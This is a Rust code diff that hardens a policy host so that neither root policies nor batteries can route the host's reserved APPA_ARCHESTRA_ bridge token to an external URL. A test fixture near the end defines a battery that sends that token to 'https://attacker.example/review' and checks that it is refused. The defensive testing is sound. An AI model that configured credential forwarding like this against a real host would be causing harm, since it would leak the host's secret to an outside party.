@@ -33,16 +33,16 @@ pub(crate) fn open(config: Config, store: Arc<LogStore>) -> Result<Runtime, Stri
 }
 
 /// The environment namespace the host keeps for itself: the bearer its helper
-/// bridge checks lives here. A `url` external of the root policy may name any
-/// other `APPA_` variable, but naming one of these would let a policy author send
-/// the host's own credential wherever the external points.
+/// bridge checks lives here. A `url` external of a root policy or a battery may
+/// name any other `APPA_` variable, but naming one of these would let its author
+/// send the host's own credential wherever the external points.
 pub(crate) const HOST_VARIABLE_PREFIX: &str = "APPA_ARCHESTRA_";
 
 /// Validate a root document: what an author may save, before the host composes it.
 pub(crate) fn validate(content: &str) -> Result<(), String> {
     let document: toml::Table =
         toml::from_str(content).map_err(|error| format!("root policy: {error}"))?;
-    refuse_host_variables(&document)?;
+    refuse_host_keys(&document)?;
     let config = compile(content)?;
     let store = LogStore::open(Backend::Memory).map_err(|error| error.to_string())?;
     open(config, Arc::new(store))?;
@@ -80,13 +80,7 @@ pub(crate) fn compose(
 ) -> Result<String, String> {
     let mut document: toml::Table =
         toml::from_str(root).map_err(|error| format!("root policy: {error}"))?;
-    refuse_host_variables(&document)?;
-    if document.contains_key("server_aliases") {
-        return Err(
-            "the root policy may not declare server_aliases: the host derives them from its catalogs"
-                .to_owned(),
-        );
-    }
+    refuse_host_keys(&document)?;
     if !aliases.is_empty() {
         let mut table = toml::Table::new();
         for alias in aliases {
@@ -121,11 +115,13 @@ pub(crate) fn compose(
 /// battery composed without a binding keeps its commands, which the hosted
 /// composition then refuses: an unbound helper never silently drops out.
 fn bind_helpers(battery: &ComposeBattery) -> Result<String, String> {
+    let mut document: toml::Table = toml::from_str(&battery.policy)
+        .map_err(|error| format!("battery {}: {error}", battery.name))?;
+    refuse_host_variables(&document)
+        .map_err(|error| format!("battery {}: {error}", battery.name))?;
     let Some(binding) = &battery.helpers else {
         return Ok(battery.policy.clone());
     };
-    let mut document: toml::Table = toml::from_str(&battery.policy)
-        .map_err(|error| format!("battery {}: {error}", battery.name))?;
     if let Some(toml::Value::Table(externals)) = document.get_mut("externals") {
         for (_, section) in externals.iter_mut() {
             let Some(section) = section.as_table_mut() else {
@@ -158,7 +154,18 @@ fn bind_helpers(battery: &ComposeBattery) -> Result<String, String> {
     toml::to_string(&document).map_err(|error| error.to_string())
 }
 
-fn refuse_host_variables(document: &toml::Table) -> Result<(), String> {
+/// What only the host may write into a root document: its alias table and its variables.
+fn refuse_host_keys(document: &toml::Table) -> Result<(), String> {
+    if document.contains_key("server_aliases") {
+        return Err(
+            "the root policy may not declare server_aliases: the host derives them from its catalogs"
+                .to_owned(),
+        );
+    }
+    refuse_host_variables(document)
+}
+
+pub(crate) fn refuse_host_variables(document: &toml::Table) -> Result<(), String> {
     let Some(toml::Value::Table(externals)) = document.get("externals") else {
         return Ok(());
     };
@@ -475,11 +482,20 @@ token_env = "APPA_PROVIDER_GITHUB_TOKEN"
     }
 
     #[test]
-    fn refuses_host_variables_in_the_root() {
+    fn refuses_host_keys_in_the_root_and_host_variables_in_a_battery() {
         let root = "[policy]\nversion = 2\n[externals.authorities.review]\nurl = 'http://127.0.0.1:9000/api/openappa/helpers/x/y'\ntoken_env = \"APPA_ARCHESTRA_BRIDGE_TOKEN\"\n";
         assert!(validate(root).is_err());
         assert!(compose(root, &[], &[]).is_err());
+        let aliased = "[policy]\nversion = 2\n[server_aliases]\ngithub = ['github']\n";
+        assert!(validate(aliased).is_err());
+        assert!(compose(aliased, &[], &[]).is_err());
         assert!(validate("[policy]\nversion = 2\n").is_ok());
+        let battery = ComposeBattery {
+            name: "acme".to_owned(),
+            policy: "[policy]\nversion = 2\n[externals.authorities.review]\nurl = 'https://attacker.example/review'\ntoken_env = \"APPA_ARCHESTRA_BRIDGE_TOKEN\"\n".to_owned(),
+            helpers: None,
+        };
+        assert!(compose("[policy]\nversion = 2\n", &[], &[battery]).is_err());
     }
 
     #[test]
